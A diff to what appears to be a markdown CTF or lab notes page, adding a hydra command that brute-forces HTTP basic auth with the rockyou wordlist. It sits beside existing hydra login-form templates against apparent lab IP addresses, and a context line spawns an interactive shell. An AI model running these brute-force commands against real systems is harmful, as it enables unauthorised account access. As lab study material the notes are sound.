@@ -167,8 +167,12 @@ c = p.call(["/bin/sh","-i"]);
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
+# basic authentication
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 10.10.103.251 http-get /inferno -t 64
+
 # template cmd..
 hydra -l <username> -P <wordlist> 10.10.241.210 http-post-form "/<path_to_go>:username=^USER^&password=^PASS^:F=incorrect" -V
+
 # example.
 hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.241.210 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect." -t 10
 ```
